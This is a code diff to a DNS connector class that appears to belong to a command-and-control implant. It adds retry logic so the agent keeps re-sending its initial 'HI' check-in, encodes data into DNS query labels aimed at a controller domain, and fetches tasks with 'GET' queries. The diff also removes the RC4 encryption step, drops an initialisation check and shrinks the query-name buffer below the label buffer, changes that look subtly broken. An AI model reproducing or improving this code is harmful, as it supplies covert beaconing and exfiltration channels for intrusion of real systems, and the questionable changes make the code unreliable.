@@ -401,6 +401,17 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
 
     _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);
 
+    // cache initial beat for potential smart HI retries
+    if (beat && beatSize) {
+        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
+        if (this->hiBeat) {
+            memcpy(this->hiBeat, beat, beatSize);
+            this->hiBeatSize = beatSize;
+            this->hiRetries  = 3;
+            this->hiSent     = FALSE;
+        }
+    }
+
     this->initialized = TRUE;
     return TRUE;
 }
@@ -415,21 +426,24 @@ void ConnectorDNS::CloseConnector()
         this->recvData = NULL;
         this->recvSize = 0;
     }
+    if (this->hiBeat && this->hiBeatSize) {
+        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
+        this->hiBeat = NULL;
+        this->hiBeatSize = 0;
+    }
 }
 
 void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 {
-	this->recvData = NULL;
-	this->recvSize = 0;
-
-	if (!this->initialized)
-		return;
-
-	CHAR qname[1024] = { 0 };
-	CHAR dataLabel[512] = { 0 };
-	ULONG maxBuf = this->pktSize;
+	// maximum payload per query, bounded by configured pktSize and actual data_size
+	ULONG maxBuf = this->pktSize ? this->pktSize : 1024;
 	if (data_size && maxBuf > data_size)
 		maxBuf = data_size;
+
+	CHAR dataLabel[1024];
+	memset(dataLabel, 0, sizeof(dataLabel));
+	CHAR qname[512];
+	memset(qname, 0, sizeof(qname));
 
 	// HI：第一次带 beat 的调用
 	if (!this->hiSent && data && data_size) {
@@ -437,7 +451,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 		if (!encBuf)
 			return;
 		memcpy(encBuf, data, maxBuf);
-		EncryptRC4(encBuf, maxBuf, this->encryptKey, 16);
 		if (!BuildDataLabelsFromBytes(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
 			MemFreeLocal((LPVOID*)&encBuf, maxBuf);
 			return;
@@ -447,8 +460,11 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 		BuildQName(this->sid, "HI", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
 		BYTE tmp[512];
 		ULONG tmpSize = 0;
-		DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
-		this->hiSent = TRUE;
+		if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
+			this->hiSent = TRUE;
+		} else if (this->hiRetries > 0) {
+			this->hiRetries--;
+		}
 		return;
 	}
 
@@ -473,6 +489,33 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 	}
 
 	// 空数据：GET 下行任务
+	if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
+		// 智能上线：在未成功发送 HI 且仍有重试次数时，优先重发 HI
+		ULONG retrySize = this->hiBeatSize;
+		if (retrySize > maxBuf)
+			retrySize = maxBuf;
+		BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
+		if (!encBuf)
+			return;
+		memcpy(encBuf, this->hiBeat, retrySize);
+		if (!BuildDataLabelsFromBytes(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
+			MemFreeLocal((LPVOID*)&encBuf, retrySize);
+			return;
+		}
+		MemFreeLocal((LPVOID*)&encBuf, retrySize);
+
+		BuildQName(this->sid, "HI", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+		BYTE tmp[512];
+		ULONG tmpSize = 0;
+		if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
+			this->hiSent = TRUE;
+		} else {
+			if (this->hiRetries > 0)
+				this->hiRetries--;
+		}
+		return;
+	}
+
 	BuildQName(this->sid, "GET", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
 	BYTE respBuf[1024];
 	ULONG respSize = 0;
